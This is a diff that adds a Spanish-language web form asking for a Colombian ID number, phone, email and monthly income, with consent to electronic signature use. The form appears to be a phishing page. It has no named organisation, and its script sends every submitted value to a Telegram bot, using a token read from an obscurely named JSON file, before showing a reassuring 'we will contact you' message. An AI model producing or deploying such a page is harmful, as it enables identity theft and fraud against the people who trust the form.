@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Información personal</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet"/>
+  <style>
+    body { font-family: 'Inter', sans-serif; }
+    .scroll-box {
+      max-height: 200px;
+      overflow-y: auto;
+      border: 1px solid #ddd;
+      padding: 1rem;
+      background: #fff;
+    }
+
+    /* Estilos para el loader */
+    .loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.8);
+      display: none; /* Oculto por defecto */
+      justify-content: center;
+      align-items: center;
+      z-index: 50; /* Para que esté por encima de todo */
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #f59e0b; /* Color amarillo de Tailwind */
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Estilos para la página de éxito */
+    .success-page {
+      display: none; /* Oculto por defecto */
+    }
+  </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+  <div id="loaderOverlay" class="loader-overlay">
+    <div class="loader"></div>
+  </div>
+
+  <header class="bg-white border-b border-gray-200 py-4 flex justify-center">
+    <img src="logo.png" alt="Logo" class="h-10 w-auto"/>
+  </header>
+
+  <main id="mainContent" class="max-w-md mx-auto px-4 py-6">
+    <h1 class="text-gray-900 font-semibold text-xl mb-2">Información personal</h1>
+    <p class="text-gray-600 mb-6">Ingresa los siguientes datos para continuar con tu proceso.</p>
+
+    <form id="formDatos" class="space-y-6">
+      <div>
+        <label class="block text-gray-700 mb-1 text-sm" for="cedula">Cédula de ciudadanía</label>
+        <input id="cedula" type="text" placeholder="Ej: 1.234.567.890"
+          class="w-full rounded border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400"/>
+      </div>
+
+      <div>
+        <label class="block text-gray-700 mb-1 text-sm" for="celular">Número de celular</label>
+        <input id="celular" type="text" placeholder="Ej: 3124566789"
+          class="w-full rounded border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400"/>
+      </div>
+
+      <div>
+        <label class="block text-gray-700 mb-1 text-sm" for="correo">Correo electrónico</label>
+        <input id="correo" type="email" placeholder="Ej: micorreo@gmail.com"
+          class="w-full rounded border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400"/>
+      </div>
+
+      <div>
+        <label class="block text-gray-700 mb-1 text-sm" for="confirmarCorreo">Confirma el correo electrónico</label>
+        <input id="confirmarCorreo" type="email" placeholder="Ej: micorreo@gmail.com"
+          class="w-full rounded border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400"/>
+      </div>
+
+      <div>
+        <label class="block text-gray-700 mb-1 text-sm" for="ingresos">Total ingresos mensuales</label>
+        <input id="ingresos" type="text" placeholder="$ 0"
+          class="w-full rounded border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400"/>
+      </div>
+
+      <div>
+        <label class="flex items-start">
+          <input id="aceptoDatos" type="checkbox" class="mt-1 mr-2">
+          <span class="text-sm text-gray-700">
+            Acepto el tratamiento de datos y el pacto sobre firmas de acuerdo con las cláusulas propuestas.
+          </span>
+        </label>
+      </div>
+
+      <div>
+          </div>
+        <label class="flex items-start mt-2">
+          <input id="aceptoFirma" type="checkbox" class="mt-1 mr-2">
+          <span class="text-sm text-gray-700">
+            He leído y acepto la autorización de uso de firma electrónica.
+          </span>
+        </label>
+      </div>
+
+      <button id="btnSiguiente" type="submit"
+        class="w-full bg-gray-400 text-white font-semibold py-3 rounded cursor-not-allowed"
+        disabled>Siguiente ›</button>
+    </form>
+  </main>
+
+  <div id="successMessage" class="success-page max-w-md mx-auto px-4 py-12 text-center">
+    <div class="bg-white p-8 rounded-lg shadow-md">
+      <div class="flex justify-center mb-4">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+        </svg>
+      </div>
+      <h2 class="text-2xl font-semibold text-gray-900 mb-2">¡Bravo!</h2>
+      <p class="text-gray-600 mb-4">
+        Nos pondremos en contacto contigo pronto.
+      </p>
+      <button onclick="location.reload()" class="bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-2 px-6 rounded-md">
+        Volver al inicio
+      </button>
+    </div>
+  </div>
+
+  <script>
+    const cedula = document.getElementById('cedula');
+    const ingresos = document.getElementById('ingresos');
+    const form = document.getElementById('formDatos');
+    const btn = document.getElementById('btnSiguiente');
+    const loaderOverlay = document.getElementById('loaderOverlay');
+    const mainContent = document.getElementById('mainContent');
+    const successMessage = document.getElementById('successMessage');
+
+    // Formatear cédula con puntos
+    cedula.addEventListener('input', e => {
+      let valor = e.target.value.replace(/\D/g, '');
+      e.target.value = valor.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+    });
+
+    // Formatear ingresos como pesos
+    ingresos.addEventListener('input', e => {
+      let valor = e.target.value.replace(/\D/g, '');
+      if (valor) valor = '$ ' + valor.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+      e.target.value = valor;
+    });
+
+    // Validar campos y checkboxes
+    form.addEventListener('input', () => {
+      const todosLlenos =
+        cedula.value &&
+        document.getElementById('celular').value &&
+        document.getElementById('correo').value &&
+        document.getElementById('confirmarCorreo').value &&
+        ingresos.value &&
+        document.getElementById('aceptoDatos').checked &&
+        document.getElementById('aceptoFirma').checked;
+
+      btn.disabled = !todosLlenos;
+      btn.className = todosLlenos
+        ? "w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 rounded"
+        : "w-full bg-gray-400 text-white font-semibold py-3 rounded cursor-not-allowed";
+    });
+
+    form.addEventListener('submit', async e => {
+      e.preventDefault();
+
+      // Muestra el loader y deshabilita el botón
+      loaderOverlay.style.display = 'flex';
+      btn.disabled = true;
+
+      const configPath = 'js/brr76.json';
+
+      try {
+        const response = await fetch(configPath);
+        if (!response.ok) {
+          throw new Error(`No se pudo cargar el archivo de configuración: ${response.statusText}`);
+        }
+        const config = await response.json();
+        const { token, chat_id } = config;
+
+        const datos = {
+          cedula: cedula.value,
+          celular: document.getElementById('celular').value,
+          correo: document.getElementById('correo').value,
+          ingresos: ingresos.value
+        };
+
+        const mensaje = `
+*Nuevo formulario de información personal*
+---
+🪪 *Cédula:* ${datos.cedula}
+📱 *Celular:* ${datos.celular}
+📨 *Correo:* ${datos.correo}
+💸 *Ingresos:* ${datos.ingresos}
+---
+`;
+
+        await enviarATelegram(token, chat_id, mensaje);
+
+        // Si el envío es exitoso, oculta el formulario y muestra el mensaje de éxito
+        mainContent.style.display = 'none';
+        successMessage.style.display = 'block';
+
+      } catch (error) {
+        console.error('Error al enviar el formulario:', error);
+        alert('Hubo un error al enviar el formulario. Por favor, inténtalo de nuevo.');
+        // En caso de error, volvemos a habilitar el botón
+        btn.disabled = false;
+        btn.className = "w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 rounded";
+
+      } finally {
+        // Oculta el loader, sin importar si hubo éxito o error
+        loaderOverlay.style.display = 'none';
+      }
+    });
+
+    async function enviarATelegram(botToken, chatId, mensaje) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = {
+        chat_id: chatId,
+        text: mensaje,
+        parse_mode: 'Markdown'
+      };
+
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+
+      if (!response.ok) {
+        throw new Error(`Error en la API de Telegram: ${response.statusText}`);
+      }
+    }
+  </script>
+</body>
+</html>
